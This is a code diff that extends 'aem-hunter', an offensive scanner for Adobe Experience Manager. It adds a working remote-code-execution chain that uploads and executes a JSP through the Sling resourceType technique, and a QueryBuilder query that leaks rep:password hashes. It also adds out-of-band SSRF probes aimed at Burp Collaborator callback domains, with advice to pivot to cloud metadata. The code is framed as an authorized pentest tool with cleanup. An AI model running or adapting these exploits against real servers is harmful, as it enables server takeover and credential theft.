@@ -804,7 +804,8 @@ class AEMHunter:
         self.enable_modules = enable_modules  # None means all
         self.fuzz_aggression = fuzz_aggression  # quick / normal / aggressive
         self.exploit = exploit  # enable destructive end-to-end PoCs (JSP RCE, admin add)
-        self.ssrf_callback = ssrf_callback  # host:port for out-of-band SSRF checks
+        self.ssrf_callback = ssrf_callback  # host:port for OOB SSRF via local listener
+        self.ssrf_collaborator = None  # Burp Collaborator domain for OOB SSRF (set by run_one_scan)
         self._fingerprint: Dict[str, Any] = {}
         self._csrf_token: Optional[str] = None
 
@@ -1194,11 +1195,58 @@ class AEMHunter:
         # Turn the confirmed READ into concrete, provable impact:
         self._recover_credentials()
         if self.exploit:
+            self._sling_resourcetype_rce()
             self._escalate_group_membership()
         elif confirmed:
             self.logger.warn("Write/install capability CONFIRMED. Re-run with --exploit to "
                              "prove end-to-end RCE (drops & removes a canary JSP) and attempt "
                              "admin-group escalation.")
+
+    def _sling_resourcetype_rce(self) -> bool:
+        """RCE via the Sling resourceType chain (Mikhail Egorov / Static-Flow):
+        write a JSP to /content -> :operation=copy it to /apps -> bind
+        sling:resourceType -> request the node so Sling executes the JSP. Works
+        when /content is writable and copy reaches /apps even if a direct /apps
+        POST-create is blocked."""
+        marker = "".join(random.choices(string.ascii_uppercase, k=6))
+        exec_token = "AEMHUNTERRCE" + marker  # only present if the JSP RUNS
+        jsp = '<%= "AEMHUN" + "TERRCE" + "' + marker + '" + "-" + System.getProperty("user.name") %>'
+        rnd = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+        cfolder = f"/content/aemhunter{rnd}"
+        afolder = f"/apps/aemhunter{rnd}"
+        rcenode = f"/content/aemhunterrce{rnd}"
+        rtype = f"aemhunter{rnd}"
+        self.logger.info("resourceType RCE: /content upload -> copy to /apps -> bind type -> exec...")
+        try:
+            self._auth_post(cfolder, data={"jcr:primaryType": "nt:folder"})
+            self._auth_post(cfolder, files={"exec.jsp": ("exec.jsp", jsp, "application/octet-stream")})
+            self._auth_post(cfolder, data={":operation": "copy", ":dest": afolder})
+            self._auth_post(rcenode, data={"sling:resourceType": rtype})
+            ex = self.client.get(rcenode + ".exec")
+            executed = ex is not None and exec_token in (ex.text or "")
+            if executed:
+                self.reporter.add(Finding(
+                    title=f"REMOTE CODE EXECUTION via Sling resourceType chain {self._role_tag()}",
+                    severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + rcenode + ".exec",
+                    evidence=f"Executed a JSP via the /content->/apps copy + resourceType chain: "
+                             f"{snippet(ex.text, 160)}",
+                    description=("END-TO-END RCE (Egorov technique, github.com/Static-Flow/aem-rce): "
+                                 "uploaded a JSP to /content, copied it to /apps via :operation=copy, "
+                                 "bound sling:resourceType, and the server executed it on request. "
+                                 "This works even when a direct /apps POST-create is blocked, as long "
+                                 "as /content is writable and the copy reaches /apps."),
+                    references=["https://github.com/Static-Flow/aem-rce",
+                                "https://www.slideshare.net/0ang3el/hacking-aem-sites"],
+                    request=(f"POST {cfolder} (jcr:primaryType=nt:folder) | "
+                             f"POST {cfolder} (exec.jsp=<JSP>) | "
+                             f"POST {cfolder} (:operation=copy&:dest={afolder}) | "
+                             f"POST {rcenode} (sling:resourceType={rtype}) | GET {rcenode}.exec"),
+                    response_snippet=snippet(ex.text, 300), role=self.role))
+                return True
+            return False
+        finally:
+            for node in (rcenode, cfolder, afolder):
+                self._auth_post(node, data={":operation": "delete"})
 
     def _emit_access_summary(self) -> None:
         """Synthesize what THIS role/session actually proved — a single,
@@ -1799,6 +1847,10 @@ class AEMHunter:
     def _dump_users(self) -> None:
         """Enumerate users / grab any leaked password hashes from readable /home."""
         sources = [
+            # Egorov's QueryBuilder selective-properties trick — can leak rep:password
+            # where the default JSON renderer hides it (slideshare/hacking-aem-sites).
+            ("/bin/querybuilder.json?type=rep:User&p.hits=selective"
+             "&p.properties=rep:principalName%20rep:password&p.limit=100", "querybuilder-selective"),
             ("/bin/querybuilder.json?path=/home/users&type=rep:User&p.hits=full&p.limit=500"
              "&p.properties=rep:authorizableId%20rep:principalName%20rep:password%20profile/email", "querybuilder"),
             ("/home/users.infinity.json", "sling-json"),
@@ -2851,13 +2903,23 @@ class AEMHunter:
     # 21. Out-of-band SSRF (listener) — ported from aem-hacker
     # =======================================================================
     def check_ssrf_oob(self) -> None:
-        if not self._enabled("ssrfoob") or not self.ssrf_callback:
+        if not self._enabled("ssrfoob"):
             return
-        self.logger.section("Out-of-band SSRF probes (callback listener)")
+        collab = self.ssrf_collaborator
+        if not (collab or self.ssrf_callback):
+            return
+        mode = "Burp Collaborator" if collab else "local listener"
+        self.logger.section(f"Out-of-band SSRF probes ({mode})")
         rid = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
         base = self.client.base_url
+        # Per-servlet callback so a Collaborator/listener hit identifies the servlet.
         for key, method, templates, data_tmpl, cve in SSRF_OOB_SERVLETS:
-            back = f"http://{self.ssrf_callback}/{SSRF_TOKEN}/{key}/{rid}/"
+            if collab:
+                # Unique sub-domain per servlet -> the Collaborator interaction's
+                # hostname tells you exactly which servlet is vulnerable.
+                back = f"http://{key}{rid}.{collab}/"
+            else:
+                back = f"http://{self.ssrf_callback}/{SSRF_TOKEN}/{key}/{rid}/"
             for tmpl in templates:
                 try:
                     path = tmpl.format(cb=back)
@@ -2869,6 +2931,30 @@ class AEMHunter:
                             "Content-Type": "application/x-www-form-urlencoded", "Referer": base})
                 except Exception:
                     pass
+
+        if collab:
+            # We cannot poll Burp Collaborator from here (needs the Collaborator
+            # client/secret). Report the probes + the subdomain->servlet map so a
+            # hit in the Collaborator tab is immediately attributable.
+            mapping = ", ".join(f"{key}{rid}.{collab} = {key}"
+                                for key, *_ in SSRF_OOB_SERVLETS)
+            self.logger.good(f"Fired OOB SSRF probes to *.{collab} — check the Burp Collaborator tab.")
+            self.reporter.add(Finding(
+                title=f"OOB SSRF probes sent to Burp Collaborator — verify in Collaborator tab {self._role_tag()}",
+                severity=SEV_MEDIUM, category=CAT_SSRF, target=self.target,
+                evidence=f"Per-servlet payloads fired. Subdomain -> servlet: {mapping}",
+                description=("Out-of-band SSRF probes were sent to AEM connector servlets using "
+                             "Burp Collaborator payloads (one sub-domain per servlet). Open the "
+                             "Collaborator tab: ANY DNS/HTTP interaction from the target confirms "
+                             "blind SSRF, and the sub-domain prefix names the vulnerable servlet "
+                             "(e.g. a hit on 'salesforcesecret" + rid + "." + collab + "' = "
+                             "SalesforceSecretServlet, CVE-2018-5006). Then pivot to internal "
+                             "services / cloud metadata and build SSRF->RCE."),
+                references=["https://github.com/0ang3el/aem-hacker",
+                            "https://portswigger.net/burp/documentation/collaborator"],
+                role=self.role))
+            return
+
         self.logger.info("Fired SSRF probes; waiting 8s for callbacks...")
         time.sleep(8)
         for key, method, templates, data_tmpl, cve in SSRF_OOB_SERVLETS:
@@ -3071,7 +3157,8 @@ def write_reports(target: str, findings: List[Finding], summary: Dict[str, int],
 def run_one_scan(target: str, cookies: Optional[Dict[str, str]], label: str,
                  proxy: Optional[str], output_dir: str, logger: Logger,
                  exploit: bool = False, use_http2: bool = False,
-                 ssrf_callback: Optional[str] = None) -> List[str]:
+                 ssrf_callback: Optional[str] = None,
+                 ssrf_collaborator: Optional[str] = None) -> List[str]:
     logger.section(f"SCAN: {label}")
     reporter = Reporter(logger)
 
@@ -3140,6 +3227,7 @@ def run_one_scan(target: str, cookies: Optional[Dict[str, str]], label: str,
         enable_modules=None, fuzz_aggression="normal", exploit=exploit,
         ssrf_callback=ssrf_callback,
     )
+    hunter.ssrf_collaborator = ssrf_collaborator
     hunter.run()
 
     summary = reporter.summary()
@@ -3187,10 +3275,15 @@ def parse_args() -> argparse.Namespace:
     p.add_argument("--exploit", action="store_true",
                    help="Enable destructive end-to-end PoCs: JSP RCE (drops+removes a canary), "
                         "admin-group escalation, ExternalJob deserialization probe. Authorized only.")
+    p.add_argument("--collaborator", metavar="DOMAIN",
+                   help="Enable out-of-band SSRF checks via Burp Collaborator (recommended). "
+                        "DOMAIN is your Collaborator payload host (e.g. abc123.oastify.com). The "
+                        "tool fires one sub-domain per servlet; check the Collaborator tab — a hit "
+                        "names the vulnerable servlet. Works with --proxy through Burp.")
     p.add_argument("--ssrf-callback", metavar="HOST:PORT",
-                   help="Enable out-of-band SSRF checks. HOST:PORT is the tester-reachable "
-                        "address the AEM server should call back to; a local listener is started "
-                        "on PORT to catch hits. (Needs the target to reach you — not via Burp.)")
+                   help="Alternative OOB SSRF: HOST:PORT of a tester-reachable host; a local "
+                        "listener is started on PORT and auto-confirms callbacks. Use when you "
+                        "have a public IP (won't work behind a forward proxy like Burp).")
     p.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
     p.add_argument("--version", action="version", version=f"aem-hunter {VERSION}")
     return p.parse_args()
@@ -3241,7 +3334,13 @@ def main() -> int:
         logger.warn("--exploit ON: will attempt JSP RCE PoC + admin escalation (with cleanup). "
                     "Authorized targets only.")
     ssrf_callback = None
-    if ns.ssrf_callback:
+    ssrf_collaborator = None
+    if ns.collaborator:
+        # accept a bare host or a pasted URL; keep just the host
+        ssrf_collaborator = re.sub(r"^https?://", "", ns.collaborator.strip()).strip("/")
+        logger.info(f"OOB SSRF via Burp Collaborator: *.{ssrf_collaborator} "
+                    "(watch the Collaborator tab)")
+    elif ns.ssrf_callback:
         ssrf_callback = ns.ssrf_callback.strip()
         try:
             bind_port = int(ssrf_callback.rsplit(":", 1)[1])
@@ -3297,7 +3396,8 @@ def main() -> int:
         try:
             all_reports.extend(run_one_scan(target, cookies, label, proxy, output_dir,
                                             logger, exploit=ns.exploit, use_http2=ns.http2,
-                                            ssrf_callback=ssrf_callback))
+                                            ssrf_callback=ssrf_callback,
+                                            ssrf_collaborator=ssrf_collaborator))
         except KeyboardInterrupt:
             logger.warn("Scan interrupted; moving on.")
         print()
